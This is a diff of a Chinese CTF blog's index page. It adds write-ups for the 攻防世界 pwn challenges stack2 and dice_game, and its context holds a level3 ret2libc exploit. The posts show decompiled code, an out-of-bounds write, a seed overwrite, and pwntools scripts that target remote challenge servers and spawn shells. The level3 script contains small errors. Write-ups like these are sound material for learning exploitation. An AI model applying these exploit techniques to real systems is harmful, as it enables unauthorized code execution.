@@ -202,7 +202,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/bp/" style="font-size: 10px;">bp</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/bp/" style="font-size: 10px;">bp</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
                     </div>
                 </section>
                 
@@ -295,6 +295,81 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-攻防世界-pwn-stack2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/" class="article-date">
+      <time datetime="2020-10-16T04:29:57.435Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/">攻防世界-pwn-stack2</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>checksec检查：</p>
+<p><img src="https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png" alt="捕获.PNG"></p>
+<p>32位，无PIE，开了NX和canary.<br>运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。</p>
+<p>IDA中查看main函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+18h] [ebp-90h]</span><br><span class="line">  unsigned int v6; &#x2F;&#x2F; [esp+1Ch] [ebp-8Ch]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+20h] [ebp-88h]</span><br><span class="line">  unsigned int j; &#x2F;&#x2F; [esp+24h] [ebp-84h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+28h] [ebp-80h]</span><br><span class="line">  unsigned int i; &#x2F;&#x2F; [esp+2Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int k; &#x2F;&#x2F; [esp+30h] [ebp-78h]</span><br><span class="line">  unsigned int l; &#x2F;&#x2F; [esp+34h] [ebp-74h]</span><br><span class="line">  char v13[100]; &#x2F;&#x2F; [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v14; &#x2F;&#x2F; [esp+9Ch] [ebp-Ch]</span><br><span class="line">  v14 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v9 &#x3D; 0;</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;*                      An easy calc                       *&quot;);</span><br><span class="line">  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);</span><br><span class="line">  puts(&quot;*(0 &lt;&#x3D; x &lt; 256)                                           *&quot;);</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;How many numbers you have:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">  puts(&quot;Give me your numbers&quot;);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v5 &amp;&amp; (signed int)i &lt;&#x3D; 0x63; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">    v13[i] &#x3D; v7;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j &#x3D; v5; ; printf(&quot;average is %.2lf\n&quot;, (double)((long double)v9 &#x2F; (double)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v6);</span><br><span class="line">          if ( v6 !&#x3D; 2 )</span><br><span class="line">            break;</span><br><span class="line">          puts(&quot;Give me your number&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">          if ( j &lt;&#x3D; 0x63 )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 &#x3D; j++;</span><br><span class="line">            v13[v3] &#x3D; v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v6 &gt; 2 )</span><br><span class="line">          break;</span><br><span class="line">        if ( v6 !&#x3D; 1 )</span><br><span class="line">          return 0;</span><br><span class="line">        puts(&quot;id\t\tnumber&quot;);</span><br><span class="line">        for ( k &#x3D; 0; k &lt; j; ++k )</span><br><span class="line">          printf(&quot;%d\t\t%d\n&quot;, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v6 !&#x3D; 3 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;which number to change:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">      puts(&quot;new number:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">      v13[v5] &#x3D; v7;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v6 !&#x3D; 4 )</span><br><span class="line">      break;</span><br><span class="line">    v9 &#x3D; 0;</span><br><span class="line">    for ( l &#x3D; 0; l &lt; j; ++l )</span><br><span class="line">      v9 +&#x3D; v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;which number to change:&quot;);</span><br><span class="line">     __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">     puts(&quot;new number:&quot;);</span><br><span class="line">     __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">     v13[v5] &#x3D; v7;</span><br></pre></td></tr></table></figure>
+
+<p>发现给了/bin/bash:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">:0804859B ; __unwind &#123;</span><br><span class="line">.text:0804859B                 push    ebp</span><br><span class="line">.text:0804859C                 mov     ebp, esp</span><br><span class="line">.text:0804859E                 sub     esp, 18h</span><br><span class="line">.text:080485A1                 mov     eax, large gs:14h</span><br><span class="line">.text:080485A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:080485AA                 xor     eax, eax</span><br><span class="line">.text:080485AC                 sub     esp, 0Ch</span><br><span class="line">.text:080485AF                 push    offset command  ; &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">.text:080485B4                 call    _system ;system</span><br><span class="line">.text:080485B9                 add     esp, 10h</span><br><span class="line">.text:080485BC                 nop</span><br><span class="line">.text:080485BD                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:080485C0                 xor     edx, large gs:14h</span><br><span class="line">.text:080485C7                 jz      short locret_80485CE</span><br><span class="line">.text:080485C9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
+
+<p>开启动态调试，在v13[v5]=v7处下断点，</p>
+<p><img src="https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png" alt="linux输入.PNG"></p>
+<p>转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：</p>
+<p><img src="https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png" alt="捕获.PNG"></p>
+<p>得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-攻防世界-pwn-反应釜开关控制" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -338,6 +413,74 @@
 
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>
 
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-攻防世界-pwn-dice_game" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" class="article-date">
+      <time datetime="2020-10-16T04:29:57.420Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">攻防世界-dice_game</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
+<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; &#x2F;&#x2F; [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; &#x2F;&#x2F; [rsp+4Ch] [rbp-4h]</span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span class="line">  *(_QWORD *)seed &#x3D; time(0LL);</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 &#x3D; read(0, buf, 0x50uLL);</span><br><span class="line">  if ( v6 &lt;&#x3D; 49 )</span><br><span class="line">    buf[v6 - 1] &#x3D; 0;</span><br><span class="line">  printf(&quot;Hi, %s. Let&#39;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  v8 &#x3D; 1;</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Game %d&#x2F;50\n&quot;, v8);</span><br><span class="line">    v5 &#x3D; sub_A20();</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( v5 !&#x3D; 1 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v8 &#x3D;&#x3D; 50 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_B28(buf);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye bye!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_B28(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  FILE *stream; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line">  printf(&quot;Congrats %s\n&quot;, a1);</span><br><span class="line">  stream &#x3D; fopen(&quot;flag&quot;, &quot;r&quot;);</span><br><span class="line">  fgets(&amp;s, 100, stream);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
+<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p>
+<p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">p&#x3D;remote(&#39;220.249.52.133&#39;,34691)</span><br><span class="line">libc&#x3D;cdll.LoadLibrary(&quot;libc.so.6&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">payload&#x3D;0x40*&#39;a&#39;+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">a&#x3D;[]</span><br><span class="line">for i in range(50):</span><br><span class="line">    a.append(libc.rand()%6+1)</span><br><span class="line">print(a)</span><br><span class="line">for i in a:</span><br><span class="line">    p.recv()</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
       
     </div>
@@ -424,74 +567,6 @@
 <p>exp:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p&#x3D;remote(&#39;111.198.29.45&#39;,52277)</span><br><span class="line"> # p&#x3D;process(&quot;.&#x2F;level3&quot;)</span><br><span class="line"> # 获取文件对象</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level3&#39;)</span><br><span class="line"> #获取lib库对象</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc_32.so.6&#39;)</span><br><span class="line"> #获取函数</span><br><span class="line">wirte_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">write_got&#x3D;elf.got[write&#39;]</span><br><span class="line">main_addr&#x3D;elf.sym[&#39;main&#39;]</span><br><span class="line"> #接受数据</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）</span><br><span class="line">payload&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> #获取wirte在got中的地址</span><br><span class="line">write_got_addr&#x3D;u32(p.recv())</span><br><span class="line">print hex(write_got_addr)</span><br><span class="line"> # 计算lib库加载基址</span><br><span class="line">libc_base&#x3D;write_got_addr-libc.sym[&#39;write&#39;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"> # 计算system的地址</span><br><span class="line">system_addr&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">print hex(bin_sh_addr)</span><br><span class="line"> #计算字符串&#x2F;bin&#x2F;sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep &quot;&#x2F;bin&#x2F;sh&quot;获取</span><br><span class="line">bin_sh_addr&#x3D;libc_base+0x15902b</span><br><span class="line">print hex(bin_sh_addr)</span><br><span class="line"> #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span><br><span class="line">payload2&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class="line"> #接受数据</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line"> #发送payloas</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"> #切换交互模式</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-攻防世界-pwn-dice_game" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.420Z" itemprop="datePublished">2020-10-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">攻防世界-dice_game</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
-<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p>
-<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; &#x2F;&#x2F; [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; &#x2F;&#x2F; [rsp+4Ch] [rbp-4h]</span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span class="line">  *(_QWORD *)seed &#x3D; time(0LL);</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 &#x3D; read(0, buf, 0x50uLL);</span><br><span class="line">  if ( v6 &lt;&#x3D; 49 )</span><br><span class="line">    buf[v6 - 1] &#x3D; 0;</span><br><span class="line">  printf(&quot;Hi, %s. Let&#39;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  v8 &#x3D; 1;</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Game %d&#x2F;50\n&quot;, v8);</span><br><span class="line">    v5 &#x3D; sub_A20();</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( v5 !&#x3D; 1 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v8 &#x3D;&#x3D; 50 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_B28(buf);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye bye!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
